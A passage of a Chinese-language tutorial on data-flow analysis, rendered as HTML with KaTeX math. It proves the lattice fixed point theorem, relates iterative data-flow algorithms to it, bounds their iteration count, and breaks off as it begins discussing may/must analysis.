xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>⊑</mo><mi>y</mi><mo>⇒</mo><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>⊑</mo><mi>f</mi><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">x \sqsubseteq y \Rightarrow f(x)\sqsubseteq f(y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⊑</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⇒</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⊑</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span>，则说函数f: L -&gt; L 是<strong>单调的</strong>。</li><li><strong>FIxed Point Theorem 不动点定理</strong>: 给定一个全格 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>L</mi><mo separator="true">,</mo><mo>⊑</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(L,\sqsubseteq)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">L</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⊑</span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mclose">)</span></span></span></span>，如果<ul><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo>:</mo><mi>L</mi><mo>→</mo><mi>L</mi></mrow><annotation encoding="application/x-tex">f: L \rightarrow L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">L</span></span></span></span> 是单调的</li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi></mrow><annotation encoding="application/x-tex">L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">L</span></span></span></span> 是有穷的(也就是f单调有界+L全格)</li></ul></li></ul></li><li><p>那么</p><ul><li><p>迭代<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>f</mi><mi>k</mi></msup><mo stretchy="false">(</mo><mi mathvariant="normal">⊥</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f^k(\bot)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord">⊥</span><span class="mclose">)</span></span></span></span>可以得到最小不动点(least fixed point)。</p></li><li><p>迭代<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>f</mi><mi>k</mi></msup><mo stretchy="false">(</mo><mi mathvariant="normal">⊤</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f^k(\top)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord">⊤</span><span class="mclose">)</span></span></span></span>可以得到最大不动点(greatest fixed point)。</p></li></ul></li><li><p>证明：</p><ul><li>根据<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">⊥</mi></mrow><annotation encoding="application/x-tex">\bot</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">⊥</span></span></span></span>和f的定义，我们可以得到：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">⊥</mi><mo>⊑</mo><mi>f</mi><mo stretchy="false">(</mo><mi mathvariant="normal">⊥</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\bot \sqsubseteq f(\bot)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83041em;vertical-align:-0.13597em;"></span><span class="mord">⊥</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⊑</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord">⊥</span><span class="mclose">)</span></span></span></span>。由于 L 是有限的，且 f 单调，根据鸽笼原理，必然存在一个 k 使得$\bot \sqsubseteq f(\bot) \sqsubseteq f^2(\bot)\sqsubseteq …\sqsubseteq f^k(\bot)\sqsubseteq f^{k+1}(\bot) <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>，且</mtext></mrow><annotation encoding="application/x-tex">，且</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">且</span></span></span></span>f^k(\bot) = f^{k+1}(\bot)$。</li><li>假设我们有另一个任意不动点 x，由于 f 是单调的，因此<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi mathvariant="normal">⊥</mi><mo stretchy="false">)</mo><mo>⊑</mo><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><msup><mi>f</mi><mn>2</mn></msup><mo stretchy="false">(</mo><mi mathvariant="normal">⊥</mi><mo stretchy="false">)</mo><mo>⊑</mo><msup><mi>f</mi><mn>2</mn></msup><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msup><mi>f</mi><mrow><mi>F</mi><mi>i</mi><mi>x</mi></mrow></msup><mo>=</mo><msup><mi>f</mi><mi>k</mi></msup><mo stretchy="false">(</mo><mi mathvariant="normal">⊥</mi><mo stretchy="false">)</mo><mo>⊑</mo><msup><mi>f</mi><mi>k</mi></msup><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>x</mi></mrow><annotation encoding="application/x-tex">f(\bot) \sqsubseteq f(x), f^2(\bot) \sqsubseteq f^2(x),...,f^{Fix} = f^k(\bot)\sqsubseteq f^k(x) = x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord">⊥</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⊑</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord">⊥</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⊑</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0913309999999998em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">x</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord">⊥</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⊑</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span></span></span></span>可知的确<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>f</mi><mrow><mi>F</mi><mi>i</mi><mi>x</mi></mrow></msup></mrow><annotation encoding="application/x-tex">f^{Fix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.035771em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">x</span></span></span></span></span></span></span></span></span></span></span></span>是最小不动点。</li></ul></li></ul><p>通过上面的证明，我们又回答了一个问题：如果我们的迭代算法符合不动点定理的要求，那么迭代得到的不动点，确实就是最优不动点。</p><h2 id="relate-iterative-algorithm-to-fixed-point-theorem"><a class="markdownIt-Anchor" href="#relate-iterative-algorithm-to-fixed-point-theorem"></a> Relate Iterative Algorithm to Fixed Point Theorem</h2><p>以上我们只是定性的描述了是否能得到最优不动点，但是迭代算法怎样才能算是符合了不动点定理的要求呢？接下来介绍关联的方法。</p><p>首先，回想 fact 的形式：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msubsup><mi>v</mi><mn>1</mn><mn>1</mn></msubsup><mo separator="true">,</mo><msubsup><mi>v</mi><mn>2</mn><mn>1</mn></msubsup><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msubsup><mi>v</mi><mi>k</mi><mn>1</mn></msubsup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(v_1^1,v_2^1,...,v_k^1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.097216em;vertical-align:-0.2831079999999999em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4518920000000004em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4518920000000004em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4168920000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2831079999999999em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，可以将其视为一个有限 lattice，它的积也是有限 lattice，因此 fact 对应到 finite lattice 是可以的。然后，我们的迭代函数 F 包括了转移函数 f 和 join/meet 函数，证明 F 是单调的，那么也就能得到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mo>:</mo><mi>L</mi><mo>→</mo><mi>L</mi></mrow><annotation encoding="application/x-tex">F: L\rightarrow L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">L</span></span></span></span> 是单调的。</p><ul><li><p>这里分两部分。</p><ul><li><p>转移函数，即 OUT = gen U (IN - kill)，显然是单调的。</p></li><li><p>那么 join/meet 函数，我们要证明其单调，就是要证明：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∀</mi><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo separator="true">,</mo><mi>z</mi><mo>∈</mo><mi>L</mi><mo separator="true">,</mo><mi>x</mi><mo>⊑</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">\forall x,y,z\in L, x\sqsubseteq y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">∀</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">L</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⊑</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span>，有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>⊔</mo><mi>z</mi><mo>⊑</mo><mi>y</mi><mo>⊔</mo><mi>z</mi></mrow><annotation encoding="application/x-tex">x \sqcup z \sqsubseteq y \sqcup z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.55556em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊔</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⊑</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.75em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊔</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span></span></span></span>。</p><ol><li>由定义，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi><mo>⊑</mo><mi>y</mi><mo>⊔</mo><mi>z</mi></mrow><annotation encoding="application/x-tex">y \sqsubseteq y \sqcup z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8304100000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⊑</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.75em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊔</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span></span></span></span></li><li>由传递性，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>⊑</mo><mi>y</mi><mo>⊔</mo><mi>z</mi></mrow><annotation encoding="application/x-tex">x \sqsubseteq y \sqcup z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⊑</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.75em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊔</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span></span></span></span></li><li>则 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi><mo>⊔</mo><mi>z</mi></mrow><annotation encoding="application/x-tex">y \sqcup z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.75em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊔</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span></span></span></span> 是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo separator="true">,</mo><mi>z</mi></mrow><annotation encoding="application/x-tex">x, z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span></span></span></span> 的 lub</li><li>又 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>⊔</mo><mi>z</mi></mrow><annotation encoding="application/x-tex">x \sqcup z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.55556em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊔</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span></span></span></span> 是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo separator="true">,</mo><mi>z</mi></mrow><annotation encoding="application/x-tex">x, z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span></span></span></span> 的 lub</li><li>因此 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>⊔</mo><mi>z</mi><mo>⊑</mo><mi>y</mi><mo>⊔</mo><mi>z</mi></mrow><annotation encoding="application/x-tex">x \sqcup z \sqsubseteq y \sqcup z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.55556em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊔</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⊑</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.75em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊔</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span></span></span></span>，证毕。</li></ol></li></ul></li></ul><p>于是我们就完成了迭代算法到不动点定理的对应。</p><ul><li><p>现在我们要回答本文开头的第三个问题了，什么时候算法停机？</p><ul><li>这个问题就很简单了，因为每个 lattice 都有其高度。假设 lattice 的高度为 h，而我们的 CFG 节点数为 k，就算每次迭代可以使一个节点在 lattice 上升一个高度，那么最坏情况下，我们的迭代次数也就是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>=</mo><mi>h</mi><mo>×</mo><mi>k</mi></mrow><annotation encoding="application/x-tex">i = h \times k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></li></ul></li><li><p>最后我们再列出这三个问题与其回答：</p><ul><li><p>算法是否确保一定能停止/达到不动点？能!会不会总是有一个解答？<strong>可以！</strong></p></li><li><p>如果能到达不动点，那么是不是只有一个不动点？可以有很多。如果有多个不动点，我们的结果是最优的吗？<strong>是的！</strong></p></li><li><p>什么时候我们会能得到不动点？<strong>最坏情况下，是 lattice 的高度与 CFG 的节点数的乘积。</strong></p></li></ul></li></ul><h2 id="maymust-analysis-a-lattice-view"><a class="markdownIt-Anchor" href="#maymust-analysis-a-lattice-view"></a> May/Must Analysis, A Lattice View</h2><h3 id="may"><a class="markdownIt-Anchor" href="#may"></a> MAY</h3><ul><li><p>对于到达定值分析，下界代表没有任何可到达的定值，上界代表所有定值都可到达。</p></li><li><p>下界代表 unsafe 